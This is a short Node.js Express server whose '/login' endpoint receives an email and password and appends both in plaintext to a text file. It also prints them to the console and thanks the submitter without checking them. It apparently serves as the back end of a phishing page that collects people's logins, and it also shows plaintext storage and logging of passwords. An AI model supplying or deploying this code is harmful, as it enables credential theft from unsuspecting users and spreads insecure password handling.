const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = 3000;

app.use(cors());
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

// Serve static files (your html, css, js) from 'public' folder
app.use(express.static(path.join(__dirname, 'public')));

// Endpoint to receive login data
app.post('/login', (req, res) => {
  const { email, password } = req.body;

  // Save data to a file (appends each entry)
  const logEntry = `Email: ${email}, Password: ${password}\n`;
  fs.appendFile('logins.txt', logEntry, (err) => {
    if (err) {
      console.error('Failed to save login:', err);
      return res.status(500).send('Server error');
    }
    console.log('Login saved:', logEntry);
    res.json({ message: 'Thank you for your submission!' });
  });
});

app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
});
